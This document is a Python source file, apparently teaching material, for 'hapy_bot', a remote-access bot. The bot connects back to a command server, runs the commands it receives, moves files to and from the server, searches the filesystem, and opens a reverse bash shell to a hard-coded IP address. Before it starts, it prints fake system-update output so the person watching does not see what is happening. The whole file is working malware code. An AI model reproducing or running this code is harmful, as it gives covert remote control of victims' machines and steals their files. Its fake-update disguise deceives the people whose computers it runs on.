################################
## NAME:     Robert Hendrickson
## ID:       instructor05
## CREATED:  10-07-2021
## UPDATED:  11-16-2021:21:20
## FILE:     hapy_bot.py
## VERSION:  2.0
################################
"""
This program will create a bot and call to a server for commands
USAGE: ~$ python3 hapy_bot.py
socket module used for send/receive to server
subprocess module used to send commands to system
re module/hapy_serch used to find files on system
os module used to walk through filesystem
getpass module required to get the username of the client connection
sys module used for exit and sys.platform
time module used to pause between connection attempts
"""
import socket
import subprocess
import base64
import re
import os
import getpass
import sys
import time
import random

red = '\033[0;31m'  # This will turn terminal output red
green = '\033[0;32m'  # This will turn terminal output green
cyan = '\033[1;36m'  # This will turn terminal output cyan
magenta = '\033[0;35m'  # This will turn terminal output magenta
yellow = '\033[0;33m'  # This will turn terminal output yellow
white = '\033[0;37m'  # This will turn terminal output white
light_red = '\033[0;91m'  # This will turn terminal output light red
light_green = '\033[0;92m'  # This will turn terminal output light green
light_yellow = '\033[0;93m'  # This will turn terminal output light yellow
light_purple = '\033[0;95m'  # This will turn terminal output light purple
turquoise = '\033[0;96m'  # This will turn terminal output turquoise
stop = '\033[0m'  # This will return terminal output to its normal color.

# we gather the starting location to use when we search for a file later
start_loc = os.getcwd()


def mysendall(socket, data, delimiter):
    """
    This is a send function for sending encoded information to server
    :socket: the socket object used for communication to the server
    :data: the information that is being sent to the server
    :delimiter: a string that will signify the end of data
    :E_data: the encoded data to send to the server
    First we encode the data then we send the data through the socket
    and return the response.
    """
    E_data = base64.b64encode(data) + delimiter
    return socket.sendall(E_data)


def myrecvall(socket, delimiter):
    """
    This is a receive function that will decode data from the server
    :socket: the socket object used for communication to the server
    :delimiter: a string that will signify the end of the file
    :data: the data that is being received from the server
    :size: an integer that is the data buffer size for our receive loop
    :D_data: the base64 decoded data from the server
    """
    data = b''
    while not data.endswith(delimiter):
        data += socket.recv(4096)
    D_data = base64.b64decode(data[:-len(delimiter)])
    return D_data


def download(socket, delimiter):
    """
    This function will recieve a filename request from the server
    and send the file to the server.
    :socket: socket object for the server
    :filename: filename from the server
    :handle: the file name variable
    :data: the information to send to the server
    """
    # Send the server a message about the file name
    data = "{0}[!]{1} Ready for file name.".format(light_purple, stop).encode()
    mysendall(socket, data, delimiter)
    # Save response from server in variable
    filename = myrecvall(socket, delimiter).decode()
    # Set up exception handling if there is an error reading the file
    # or if the file cannot be found
    try:
        with open(filename, 'r') as handle:
            data = handle.read()
    except Exception as e:
        # Get the error type for an exception
        typee = str(type(e)).split()[1].split('>')[0]
        # Format the error message and type for sending to the server
        data = '{0}[!]{3} ERROR TYPE: {1} \n    --ERROR:{2}'.format(light_red, typee, str(e), stop)
        # Encode the message as bytes
        data = data.encode()
        #send the message to the server
        mysendall(socket, data, delimiter)
        # The next three steps are for syncing client/server
        myrecvall(socket, delimiter).decode()
        data = '{0}[!]{1} Client download failed'.format(light_red, stop).encode()
        mysendall(socket, data, delimiter)
    else:
        # If no error we will save the base64 encoded file to a variable
        # and send that to the server for writing on the server
        data = data.encode()
        mysendall(socket, data, delimiter)
        # Sync with the server to prevent hang in commands
        myrecvall(socket, delimiter).decode()
        # Now we send that it is complete
        data = '{0}[!]{1} Client download complete'.format(light_purple, stop).encode()
        mysendall(socket, data, delimiter)


def search(socket, delimiter):
    """
    This function will search the filesystem for a file specified
    if no file is specified it will use the default search pattern
    :filepath: the place to start the search for a file
    :known: if the filename is know or unknown
    :data: the information that is being sent to the server
    :platform: the system platform for the client
    :name: the name of the file
    :results: the results of the search exspressivesearch function
    :E_results: the base64 encoded results of the function
    :Expressive Search: a module that takes a filepath, a boolean, and
                        filename and searches the file system for that file
                        if found it will provide a md5 hash of the file.
    """
    # tell server we are initializing the search routine
    data = '{}[!]{} Starting Search'.format(magenta, stop).encode()
    mysendall(socket, data, delimiter)
    # we will check the current directory for the hapy_serch module
    if 'search' not in os.listdir():
        # now we we add the starting location to path the script is running from
        sys.path.append(start_loc)
        # Now we import the search
        import hapy_serch
    else:
        # If the file is in the dir listing import the file
        import hapy_serch
    # First we will receive the filepath from the server
    filepath = myrecvall(socket, delimiter).decode()
    # Now we will send that we received the file path to start the search
    data = '{}[!]{} File path received at client'.format(magenta, stop).encode()
    # Third we call the send function  to send the message
    mysendall(socket, data, delimiter)
    # Now we see if the filename is known or not
    known = myrecvall(socket, delimiter).decode() 
    if known.startswith('y'):
        # Will check the value above, if y is in known it will 
        # send ready for file name, if unknown if will send the 
        # other message
        known = True
        data = '{}[!]{} Ready for file name'.format(magenta, stop).encode()
        # We let the server know we are ready for the file name
        mysendall(socket, data, delimiter)
        # We receive, decode, and strip the file name
        name = myrecvall(socket, delimiter).decode().strip()
    elif known.startswith('n'):
        # We are preparing a few variables to send to the server
        known = False
        name = False
        # We are telling the server that we will use the default regular expression
        data = '{0}[!] No file name, using default pattern{1}'.format(magenta, stop).encode()
        mysendall(socket, data, delimiter)
        # now we sync the server to prevent hanging sockets
        myrecvall(socket, delimiter).decode()
    # We will save the results of the search function to a variable
    try:
        results = hapy_serch.searcher(filepath, known, name, sys.platform)
    except Exception as e:
        # If an exception occurs we send the error to the server
        typee = str(type(e)).split()[1].split('>')[0]
        data = '{0}[!]{1} ERROR TYPE: {2} \n    --ERROR:{3}'.format(light_red, stop, typee,str(e)).encode()
        mysendall(socket, data, delimiter)
        # We receive the server response
        myrecvall(socket, delimiter).decode()
        # Tell the server the the command failed
        data = '{0}[!] Client search failed{1}'.format(light_red, stop).encode()
        # Send the fail message
        mysendall(socket, data, delimiter)
    else:
        # Check if the length of results is greater than zero
        if len(results):
            # Since the results will be a list we need to get how many matches were found
            data = str(len(results)).encode()
            # Send the number of matches to the server
            mysendall(socket, data, delimiter)
            # get the server message 
            myrecvall(socket, delimiter).decode() 
            # Loop through the number of matches 
            for i in results:
                # we will now send the results of the search back to the server 
                mysendall(socket, str(i).encode(), delimiter)
                # We sync with the server to prevent a hang after a large file
                myrecvall(socket, delimiter).decode()
            # Now we tell the server the command is complete
            data = '{0}[!]{1} Client search complete'.format(magenta, stop).encode()
            # Send the completion message
            mysendall(socket, data, delimiter)
        else:
            # If there are no results tell the server
            data = '{0}[!]{1} No results found'.format(magenta, stop).encode()
            # Send the message to the client
            mysendall(socket, data, delimiter)
            # Receive the server message
            myrecvall(socket, delimiter).decode()
            # Also tell the server the command is complete
            data = '{0}[!]{1} Client search complete'.format(magenta, stop).encode()
            # Send the message to the server
            mysendall(socket, data, delimiter)


def shell(mysocket, delimiter):
    """
    This will receive a call back from the client with a terminal from a linux client
    :mysocket: The original connection that was used to communicate
    """
    try:
        if sys.platform.startswith('win'):
            data = "{0}[!]{1} --HAL9000:I'm sorry I can't do that Dave.\n--Dave: Open the pod bay doors HAL!".format(light_red, stop).encode()
            mysendall(mysocket, data, delimiter)
            myrecvall(mysocket, delimiter).decode()
            data = '{0}[!]{1} We need more lemon pledge'.format(light_red, stop).encode()
            mysendall(mysocket, data, delimiter)
        elif sys.platform.startswith('linux'):
            data = '{0}[!]{1} Client received shell request\n'.format(cyan, stop).encode()
            mysendall(mysocket, data, delimiter)
            time.sleep(1)
            s = socket.socket()
            s.connect(('192.168.86.27', 34543))
            # We duplicate the standard out, in and error
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            # we call the 
            subprocess.call(['/bin/bash', '-i'])
            myrecvall(mysocket, delimiter)
            data = '{0}[!]{1} Client Shell Finished\n'.format(cyan, stop).encode()
            mysendall(mysocket, data, delimiter)
    except Exception as e:
        type_e = str(type(e)).split()[1].split('<')[0]
        data = '{0}[!] Command exception:\n    --ERROR TYPE: {2}\n    --ERROR: {3}{1}'.format(light_red, stop, type_e, str(e)).encode()
        mysendall(mysocket, data, delimiter)
        myrecvall(mysocket, delimiter).decode()
        data = '{}[!] Client command failed.{}'.format(light_red, stop).encode()
        mysendall(mysocket, data, delimiter)


def multi(socket, delimiter):
    """
    This will run commands in a loop
    """
    command = ''
    while command != 'back':
        user = getpass.getuser()
        user_dir = os.getcwd()
        data = user+';'+user_dir
        data = data.encode()
        # We send the information to the server
        mysendall(socket, data, delimiter)
        # We receive a command, then if it matches a key word
        # complete the appropriate action
        command = myrecvall(socket, delimiter).decode()
        if command[:4] == 'back':
            break
        else:
            commandant(socket, delimiter)
            continue


def commandant(socket, delimiter):
    # Get the username for use later 
    user = getpass.getuser()
    data = '{0}[!]{1} Client received command'.format(turquoise, stop).encode()
    mysendall(socket, data, delimiter)  
    # Now we get the command from the server
    command = myrecvall(socket, delimiter).decode()
    # If the command is cd we need to use the os.chdir command;
    if command[:2] == 'cd':
        command = command.strip()
        # We need exception handling for a cd command, if there is no directory then send the error
        try:
            # We split the string on a space, and set the value of the second item to our location
            commandloc = command.split(' ')[1]
            if '~' in commandloc:
                if sys.platform.startswith('linux'):
                    # Now we change to the home directory
                    commandloc = '/home/{}'.format(user)
                elif sys.platform.startswith('win'):
                    commandloc = 'C:\\Users\\{}'.format(user)
        except IndexError as ie:
            # We tell the server we are switching to the default directory
            data = '{0}[!]{1} Changing to default directory'.format(turquoise, stop).encode()
            mysendall(socket, data, delimiter)  
            # We do a conditional based on the platform the script is running in
            if sys.platform.startswith('linux'):
                # Now we change to the home directory
                os.chdir('/home/{}'.format(user))
            elif sys.platform.startswith('win'):
                os.chdir('C:\\Users\\{}'.format(user))
            # Now we sync the server with the client
            myrecvall(socket, delimiter).decode()  
            # Now we tell the server that it failed
            data = '{0}[!]{1} Changed directory to: {2}'.format(turquoise, stop, os.getcwd()).encode()
            mysendall(socket, data, delimiter)  
        except Exception as e:
            # We tell the server there was an error
            data = '{0}[!] ERROR: {2}{1}'.format(light_red, stop, str(e)).encode()
            # We send the error to the server
            mysendall(socket, data, delimiter)
            # Now we sync the server with the client
            myrecvall(socket, delimiter).decode()
            # Now we tell the server that it failed
            data = '{0}[!] Client command failed{1}'.format(light_red, stop).encode()
            mysendall(socket, data, delimiter)
        else:
            # If there is no error
            # We use the change dir command to the specified place
            os.chdir(commandloc)
            # We send back that the dir is changed to the new location
            data = '{0}[!]{1} Changed directory to: {2}'.format(turquoise, stop, os.getcwd()).encode()
            mysendall(socket, data, delimiter)
            # Now we sync the information from the server
            myrecvall(socket, delimiter).decode()
            # Now we send that the command is complete
            data = '{0}[!]{1} Client command complete'.format(turquoise, stop).encode()
            mysendall(socket, data, delimiter)
    elif command[:4] == 'back': # this isn't processing
        # If back command is received tell server
        data = '{0}[!]{1} Received back command'.format(turquoise, stop).encode()
        # Send received message
        mysendall(socket, data, delimiter)
        # Receive server message
        myrecvall(socket, delimiter)
        # Tell server client is exiting command loop
        data = '{0}[!]{1} Exiting command loop'.format(turquoise, stop).encode()
        # Send exit message
        mysendall(socket, data, delimiter)
    else: # future shell functionality---
        # Now input that command in to a variable that is the
        # results from subprocess.Popen function
        proc = subprocess.Popen(command,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE)
        # save the command output and errors to variables
        output, errors = proc.communicate()
        # Check if our output is empty
        if not len(output):
            # If empty tell the server there is no output
            output = '{0}[!]{1} No command output at client\n'.format(turquoise, stop).encode()
        # combine the bytes objects from the previous steps
        results = output + errors
        # now we send the results to the server
        mysendall(socket, results, delimiter)
        # now we need to wait for a server next message
        myrecvall(socket, delimiter).decode()
        # now we send that the command completed
        data = "{0}[!]{1} Client command complete".format(turquoise, stop).encode()
        mysendall(socket, data, delimiter)


def upload(socket, delimiter):
    """
    This function will receive a file from the server and save it to the
    local file system
    :data: the information to send the server
    :targetname: the name of the location for the file.
    :D_recvd: the decoded file contents
    :handle: the file object
    """
    # First we receive the target filename
    target_name = myrecvall(socket, delimiter).decode().strip()
    # Next we tell the server we are ready for file content
    data = '{0}[!]{1} Ready for file contents.'.format(light_purple, stop).encode()
    mysendall(socket, data, delimiter)
    # We save the file contents from the server into a variable
    D_recvd = myrecvall(socket, delimiter).decode()
    # We set up exception handling if there is an error writing
    # the new file
    try:
        # We use the name received and write the file
        with open(target_name, 'w') as handle:
            # We are writing the contents we received earlier
            handle.write(D_recvd)
    except Exception as e:
        type_e = str(type(e)).split()[1].split('<')[0]
        # send the error or file uploaded
        data = '{0}[!]Upload function error:\n    --ERROR TYPE: {3}\n    --ERROR: \n{2}{1}'.format(light_red, stop, str(e), type_e).encode()
        # we send the error across the socket
        mysendall(socket, data, delimiter)
        # we receive the server message
        myrecvall(socket, delimiter).decode()
        # We send our fail message
        data = '{0}[!] Client upload failed{1}'.format(light_red, stop).encode()
        mysendall(socket, data, delimiter)
    else:
        # If there are no exceptions we tell the server the file was uploaded to the location
        data = '{0}[!]{1} File uploaded to client at: {2}'.format(light_purple, stop, target_name).encode()
        # now we send our encoded bytes
        mysendall(socket, data, delimiter)
        # We receive the server response
        myrecvall(socket, delimiter).decode()
        # We tell the server that the command is complete
        data = '{0}[!]{1} Client upload complete'.format(light_purple, stop).encode()
        # Now we send command complete to the server
        mysendall(socket, data, delimiter)


def main():
    """
    This function will establish a connection with the server 
    and run shell commands that are received from the server
    :ip: the server ip
    :ports: the port to connect to on the server
    :delimiter: the delimiter to append to the end of all commands
                and files sent across the connection
    :mysocket: the socket connection to the server
    """
    if sys.platform.startswith('linux'):
        print('Updating Boot Packages...')
        time.sleep(.2)
        print("Get:1 https://apt.releases.hashicorp.com buster InRelease [8,654 B]")
        time.sleep(.2)
        print("Get:2 https://packages.linux.update.com/apt sdk-buster InRelease [6,774 B]")
        time.sleep(.5)
        print("Get:3 https://apt.releases.hashicorp.com buster/main Packages [35.3 kB]")
        time.sleep(.3)
        print("Get:4 https://packages.linux.update.com/apt sdk-buster/main Packages [196 kB]")
        time.sleep(.5)
        print("Err:5 http://apt.postgresql.org/pub/repos/apt buster-pgdg InRelease")
        print("  Temporary failure resolving 'apt.postgresql.org'")
        time.sleep(.3)
        print("Hit:6 http://storage.apis.com/bazel-apt stable InRelease")
        time.sleep(.2)
        print("Get:7 http://packages.linux.update.com/apt gcsfuse-buster InRelease [5,388 B]")
        time.sleep(.5)
        print("Get:8 http://security.grub-linux.org/grubian-security buster/updates InRelease [65.4 kB]")
        time.sleep(.2)
        print("Get:9 https://cli.github.com/packages buster InRelease [3,743 B]")
        time.sleep(.3)
        print("Get:10 https://packages.linux.com/grubian/10/prod buster InRelease [29.8 kB]")
        time.sleep(.7)
        print("Get:11 http://security.linux.org/grubv2-security buster/updates/main Sources [202 kB]")
        time.sleep(.3)
        print("Get:12 http://security.linux.org/grubv2-security buster/updates/main Packages [308 kB]")
        time.sleep(1)
        print("Get:13 https://packages.linux.com/distro/10/prod buster/main Packages [131 kB]")
        time.sleep(1)
        print("Err:14 http://repo.mysql.com/apt/grub-security buster InRelease")
        print("  Temporary failure resolving 'repo.mysql.com'")
        time.sleep(.1)
        print("Hit:15 http://deb.linux.org/grub-buster InRelease")
        time.sleep(.4)
        print("Get:16 http://deb.linux.org/grub-buster-updates InRelease [51.9 kB]")
        time.sleep(.3)
        print("Hit:18 https://download.docker.com/linux/grub-ian buster InRelease")
        time.sleep(.2)
        print("Get:19 https://packages.sari.org/php buster InRelease [6,837 B]")
        time.sleep(.3)
        print("Hit:17 https://apt.llvm.org/buster llvm-toolchain-buster-9 InRelease")
        time.sleep(.2)
        print("Ign:20 http://ftp.linux-grub.org/stretch InRelease")
        print("Get:21 http://ftp.linux-grub.org/stretch-backports InRelease [91.8 kB]")
        time.sleep(.2)
        print("Hit:22 http://ftp.linux-grub.org/stretch-updates InRelease")
        print("Hit:23 http://ftp.linux-grub.org/stretch Release")
        time.sleep(1)
        print("Get:24 https://packages.sari.org/php buster/main Packages [338 kB]")
        time.sleep(.2)
        print("Fetched 1,482 kB in {}s ({} kB/s)".format(9, 1482//9))
        print('Building package lists...')
        print("Reading package lists...",end='')
        time.sleep(.1)
    elif sys.platform.startswith('win'):
        for i in range(1,9):
            print("Downloading Update {} of 8...".format(i))
            time.sleep(random.randint(0,3))
            print("Installing Update {} of 8...".format(i))
            time.sleep(random.randint(0,5))
        print('Finalizing Update....')

    # This is setting up the client to communicate with the server
    ip = '127.0.0.1'# '192.168.86.27'
    ports = [8888, 7777, 6666, 5555]
    delimiter = b'!!@@##$$!!'
    # This is the socket object that will connect to the server
    mysocket = socket.socket()
    # initialize a connection loop to continuously try connecting
    connected = False
    while not connected:
        for port in ports:
            time.sleep(1)
            cport = port
            try:
                mysocket.connect((ip, port))
            except socket.error:
                continue
            except KeyboardInterrupt:
                sys.exit()
            else:
                connected = True
                break
    # Initialize the loop to handle bot commands
    while True:
        # We first get our username and  working directory
        user = getpass.getuser()
        user_dir = os.getcwd()
        data = user+';'+user_dir
        data = data.encode()
        # We send the information to the server
        mysendall(mysocket, data, delimiter)
        # We receive a command, then if it matches a key word
        # complete the appropriate action
        command = myrecvall(mysocket, delimiter).decode().strip()
        # create a list of words to stop the client
        breaklist = ['dc','qt','ex']
        # If the command is in the breaklist exit the client
        if command in breaklist:
            # if quit is received break loop and terminate connection to server
            data = '{0}[!]{1} Connection terminated at client'.format(white, stop).encode()
            mysendall(mysocket, data, delimiter)
            print('Done')
            break
        elif command[:2] == 'dl':
            # If download is received, run download function
            download(mysocket, delimiter)
            # go back to beginning of loop
            continue
        elif command[:3] == 'src':
            # If search is received, run search function
            search(mysocket, delimiter)
            # go back to beginning of loop
            continue
        elif command[:2] == 'ul':
            # If upload is received run upload function
            upload(mysocket, delimiter)
            # go back to beginning of loop
            continue
        elif command[:3] == 'cmd':
            # If cmd - command is received create a message to let the server know
            # that the client is ready for commands and encode it as bytes
            data = '{0}[!]{1} Client ready for commands'.format(turquoise, stop).encode()
            # Send the server the message
            mysendall(mysocket, data, delimiter)
            # Receive the single or multiple command answer from the server
            ask = myrecvall(mysocket, delimiter).decode().strip()
            # If s - single run the commandant function once
            if ask == 's':
                # If command is received call the function above
                commandant(mysocket, delimiter)
                # go back to the beginning of the loop
                continue
            # If m - multiple run the multi function
            elif ask == 'm':
                # The multi function will run commands in a loop
                multi(mysocket, delimiter)
                # go back to the beginning of the loop
                continue
        elif command[:2] == 'sh':
            # If sh - shell is received run the shell function
            shell(mysocket, delimiter)
            continue
        elif command.strip() == '[-] ctrl+c':
            myrecvall(mysocket,delimiter).decode()
            data = b'[!] Client exit'
            mysendall(mysocket, data, delimiter)
            sys.exit()
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('Done')
        sys.exit()
    except socket.timeout:
        print('Done')
        sys.exit()
